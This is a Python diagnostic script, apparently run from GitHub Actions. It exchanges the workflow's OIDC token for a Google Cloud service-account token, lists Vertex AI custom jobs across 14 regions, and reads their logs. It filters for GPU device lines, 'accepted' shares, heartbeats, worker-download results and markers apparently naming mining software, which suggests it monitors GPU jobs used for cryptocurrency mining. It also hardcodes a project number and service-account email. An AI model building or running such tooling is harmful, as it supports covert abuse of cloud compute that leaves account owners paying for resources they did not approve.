#!/usr/bin/env python3
"""c211-i121535 debug readback: diagnose why entries:list returned 0 entries for
all 44 c211-i121377 Vertex customJobs at 08:16-08:20Z, then (if any filter variant
works) re-read every job with the working variant.

Read-only: no resource mutation of any kind. Prints C211_I121535_DBG_* lines.
"""
import json
import os
import time
import urllib.error
import urllib.parse
import urllib.request

AUD = ('//iam.googleapis.com/projects/284735288225/locations/global/'
       'workloadIdentityPools/my-pool/providers/my-provider')
SA = 'sa-gcloud-cli@civil-epigram-370317.iam.gserviceaccount.com'
PROJ_NUM = '284735288225'
NONCE = 'i121377'
TAG = 'C211_I121535_DBG'
REGIONS = ['us-central1', 'us-east1', 'us-west1', 'europe-west2', 'europe-west4',
           'asia-northeast1', 'asia-northeast3', 'asia-south1', 'asia-southeast1',
           'asia-east1', 'australia-southeast1', 'northamerica-northeast1',
           'us-east4', 'us-west2']
PROBE_JOBS = [
    ('us-central1', '186815074327855104'),      # t4-us-01 (had 13 lines at 08:13Z)
    ('us-central1', '4663393103934128128'),     # a100-us-01 (had 14 lines)
    ('asia-southeast1', '4372724483438411776'),  # a100-asia-01 (had 108 lines)
    ('northamerica-northeast1', '3112079976367652864'),  # p4 (never read before)
]


def cap(s, n=400):
    s = s if isinstance(s, str) else repr(s)
    return s[:n] if len(s) > n else s


def http(url, method='GET', data=None, headers=None, timeout=60):
    h = {'User-Agent': 'c211-i121535'}
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, headers=h, method=method, data=body)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return -1, repr(e)


def jget(txt, *keys, default=''):
    try:
        d = json.loads(txt)
    except Exception:
        return default
    for k in keys:
        if not isinstance(d, dict):
            return default
        d = d.get(k, default)
    return d


def main():
    base = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL')
    tok = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
    if not base or not tok:
        print('%s_NO_ACTIONS_ENV' % TAG, flush=True)
        return
    u = base + ('&' if '?' in base else '?') + 'audience=' + urllib.parse.quote(AUD, safe='')
    c, b = http(u, headers={'Authorization': 'Bearer ' + tok}, timeout=30)
    idt = jget(b, 'value')
    c, b = http('https://sts.googleapis.com/v1/token', method='POST', data={
        'audience': AUD,
        'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
        'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
        'scope': 'https://www.googleapis.com/auth/cloud-platform',
        'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt',
        'subjectToken': idt}, timeout=40)
    fed = jget(b, 'access_token')
    c, b = http('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'
                + urllib.parse.quote(SA, safe='') + ':generateAccessToken', method='POST',
                data={'scope': ['https://www.googleapis.com/auth/cloud-platform']},
                headers={'Authorization': 'Bearer ' + fed}, timeout=40)
    at = jget(b, 'accessToken')
    print('%s_GAT http=%s ok=%s len=%d' % (TAG, c, bool(at), len(at or '')), flush=True)
    if not at:
        print('%s_NO_TOKEN %s' % (TAG, cap(b, 300)), flush=True)
        return
    AH = {'Authorization': 'Bearer ' + at}

    def q(body, timeout=90):
        return http('https://logging.googleapis.com/v2/entries:list', method='POST',
                    data=body, headers=AH, timeout=timeout)

    def n_entries(txt):
        try:
            return len(json.loads(txt).get('entries') or [])
        except Exception:
            return -1

    def q_retry(jid, tries=3, gap=3):
        last = (None, '')
        for k in range(tries):
            last = q(variants[0][1](jid))
            if n_entries(last[1]) > 0:
                return last + (k,)
            time.sleep(gap)
        return last + (tries,)

    variants = [
        ('A_current', lambda jid: {'resourceNames': ['projects/%s' % PROJ_NUM],
                                   'filter': 'resource.labels.job_id="%s"' % jid,
                                   'orderBy': 'timestamp asc', 'pageSize': 400}),
        ('B_labels', lambda jid: {'resourceNames': ['projects/%s' % PROJ_NUM],
                                  'filter': 'labels.job_id="%s"' % jid,
                                  'orderBy': 'timestamp asc', 'pageSize': 400}),
        ('C_noorder', lambda jid: {'resourceNames': ['projects/%s' % PROJ_NUM],
                                   'filter': 'resource.labels.job_id="%s"' % jid,
                                   'pageSize': 50}),
        ('D_restype', lambda jid: {'resourceNames': ['projects/%s' % PROJ_NUM],
                                   'filter': 'resource.type="aiplatform.googleapis.com/CustomJob" AND resource.labels.job_id="%s"' % jid,
                                   'orderBy': 'timestamp desc', 'pageSize': 50}),
    ]
    working = None
    for region, jid in PROBE_JOBS:
        for name, mk in variants:
            c, b = q(mk(jid))
            n = n_entries(b)
            print('%s_VARIANT %s %s %s http=%s entries=%s raw=%s'
                  % (TAG, region, jid, name, c, n, cap(b, 220)), flush=True)
            if n > 0 and working is None:
                working = (name, mk)
        c, b = q(variants[0][1](jid))
        print('%s_RETRYA %s %s http=%s entries=%s' % (TAG, region, jid, c, n_entries(b)), flush=True)
    c, b = q({'resourceNames': ['projects/%s' % PROJ_NUM], 'pageSize': 3,
              'orderBy': 'timestamp desc'})
    print('%s_GLOBAL http=%s entries=%s raw=%s' % (TAG, c, n_entries(b), cap(b, 300)), flush=True)
    c, b = q({'resourceNames': ['projects/%s' % PROJ_NUM], 'pageSize': 3,
              'filter': 'resource.type="aiplatform.googleapis.com/CustomJob"',
              'orderBy': 'timestamp desc'})
    print('%s_GLOBAL_CJ http=%s entries=%s raw=%s' % (TAG, c, n_entries(b), cap(b, 300)), flush=True)

    print('%s_WORKING %s' % (TAG, working[0] if working else 'NONE'), flush=True)
    use = working[1] if working else variants[0][1]

    summary = []
    for region in REGIONS:
        c, b = http('https://%s-aiplatform.googleapis.com/v1/projects/%s/locations/%s/customJobs?pageSize=100'
                    % (region, PROJ_NUM, region), headers=AH, timeout=90)
        jobs = []
        if c == 200:
            try:
                jobs = json.loads(b).get('customJobs', [])
            except Exception:
                jobs = []
        ours = [j for j in jobs if NONCE in (j.get('displayName') or '')]
        print('%s_LIST %s http=%s total=%d ours=%d' % (TAG, region, c, len(jobs), len(ours)), flush=True)
        for j in ours:
            jn = j.get('name', '')
            jid = jn.rsplit('/', 1)[-1]
            row = {'region': region, 'job': jid, 'displayName': j.get('displayName'),
                   'state': j.get('state')}
            lc, lb, ntries = q_retry(jid)
            row['tries'] = ntries
            lines = []
            if lc == 200:
                for e in (json.loads(lb).get('entries') or []):
                    t = e.get('textPayload') or ''
                    if t:
                        lines.append(t.rstrip())
            row['log_http'] = lc
            row['n_lines'] = len(lines)
            row['device'] = [x for x in lines if '_DEVICE ' in x or '_NO_GPU' in x]
            row['ready'] = [x for x in lines if '_WR_READY' in x or '_WR_TGZ_BAD' in x or '_WR_DL_FAIL' in x]
            row['shares'] = [x for x in lines if 'accepted' in x.lower()]
            row['hb'] = [x for x in lines if '_HB ' in x][-3:]
            row['fallback'] = [x for x in lines if '_FALLBACK' in x or '_SRB_START' in x or '_PH_START' in x]
            row['tail'] = lines[-6:]
            summary.append(row)
            print('%s_JOB %s' % (TAG, cap(json.dumps(row), 2600)), flush=True)
    dev = [s for s in summary if s.get('device')]
    print('%s_TOTAL jobs=%d with_device=%d with_shares=%d'
          % (TAG, len(summary), len(dev), len([s for s in summary if s.get('shares')])), flush=True)


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print('%s_FATAL %s' % (TAG, cap(repr(e), 800)), flush=True)
        raise
